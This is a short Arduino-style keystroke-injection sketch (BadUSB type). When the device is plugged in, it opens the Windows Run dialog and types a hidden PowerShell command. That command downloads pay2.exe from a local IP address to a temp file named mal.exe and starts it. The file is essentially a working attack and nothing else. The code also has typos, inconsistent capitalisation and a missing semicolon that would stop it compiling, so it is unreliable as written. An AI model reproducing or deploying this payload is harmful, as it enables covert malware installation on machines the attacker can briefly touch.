#include<keyboard.h>
void setup() {
delay(2000);
type(KEY_LEFT_GUI,false);
type('d',false);
keyboard.releaseAll();
delay(500);
type(key_LEFT_GUI,fasle)
type('r',false);
delay(500);
keyboard.releaseAll();
delay(1000);
print(F("powershell -windowsstyle hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.10.107/pay2.exe','%TEMP%\\mal.exe'); Start-Process \"%TEMP%\\mal.exe\""));
delay(1000);
type(KEY_RETUREN,false);
Keyboard.releaseAll();
Keyboard.end();
}
Void type(int key, boolean release) {
Keyboard.press(key);
if(release)
keyboard.release(key);
}
void print(const _FlashStringHelper *value) {
keyboard.print(value);
}
void loop () {}


